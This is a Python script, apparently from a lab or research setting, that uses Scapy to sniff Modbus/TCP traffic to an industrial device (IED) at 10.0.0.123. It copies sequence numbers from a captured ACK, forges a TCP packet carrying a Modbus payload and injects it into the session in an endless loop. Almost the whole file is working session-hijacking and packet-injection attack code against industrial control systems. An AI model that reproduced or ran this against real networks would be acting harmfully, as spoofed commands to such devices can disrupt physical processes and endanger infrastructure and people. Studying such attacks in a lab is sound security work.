import time

from scapy.all import *
from scapy.layers.inet import *

from packet import Modbus, ModbusTCP

ied_ip = "10.0.0.123"
#modbus_string = "x00\\x00\\x00\\x06\\x03\\x06\\x00\\x05"
modbus_string = "x06\\x03x\\x06\\x00\\x05"

while True:

    counter = 0
    ied_write_request = 0
    while not counter>10:
        pkts = sniff(iface="eth1", count=5)

        try: 
            output = [index for index, packet in enumerate(pkts) if packet[IP].dst==ied_ip and modbus_string in str(packet[Raw].load)]
        except:
            output = []

        n_packets = len(output)
        if n_packets!=0 and output[n_packets-1]+1<5:
            print("done\n")

            modbus_response_index = output[len(output)-1]
            modbus_response = pkts[modbus_response_index]

            tcp_ack_index = modbus_response_index+1
            tcp_ack = pkts[tcp_ack_index]

            print("---Modbus Response")
            modbus_response.show()
            print("---TCP ACK")
            tcp_ack.show()

            print("     forging packet")
            tcpdata = {
            	'src': tcp_ack[IP].src,
            	'dst': tcp_ack[IP].dst,
            	'sport': tcp_ack[TCP].sport,
            	'dport': tcp_ack[TCP].dport,
            	'seq': tcp_ack[TCP].seq+1,
            	'ack': tcp_ack[TCP].ack,
            	'wnd': tcp_ack[TCP].window,
            }

            payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
            	TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
            	flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
            payload = payload/ModbusTCP()/Modbus()            
            
            print("     injecting packet")
            send(payload, verbose=0, iface="eth1")
            
            print("     packet injected")
            payload.display()
        else: 
            print("retry")
            counter = counter+1

    time.sleep(1)
	
